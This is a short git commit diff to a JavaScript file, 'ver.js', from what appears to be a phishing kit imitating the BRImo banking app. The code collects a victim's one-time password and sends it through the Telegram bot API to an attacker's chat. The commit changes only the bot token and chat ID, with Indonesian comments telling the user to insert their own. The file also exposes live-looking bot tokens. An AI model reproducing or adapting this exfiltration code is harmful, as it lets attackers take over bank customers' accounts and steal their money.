aa9fc01af027097bb640775268dc0dedc9cf5b1c
maluku2025 <bupatibaru13@gmail.com>
2025-05-28 07:25:57 +0700

    Update ver.js

--- ver.js
+++ ver.js
@@ -4,8 +4,8 @@ function kirimPesan1(event){
 
     var gabungan = `( BRImo | OTP )%0A%0A- Code OTP : ${nama1.value}`;
 
-var token = '7893053841:AAFtmaCs6EG1E0-blJWLFIy8S78ShAKcNzE'; // Ganti dengan token bot yang kamu buat
-    var grup = '6809554683'; // Ganti dengan chat id dari bot yang kamu buat    
+var token = '8017509602:AAFZqiQLmp8l8N6qiyD7P-kWQZ48MRlNSgA'; // Ganti dengan token bot yang kamu buat
+    var grup = '8118974869'; // Ganti dengan chat id dari bot yang kamu buat    
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
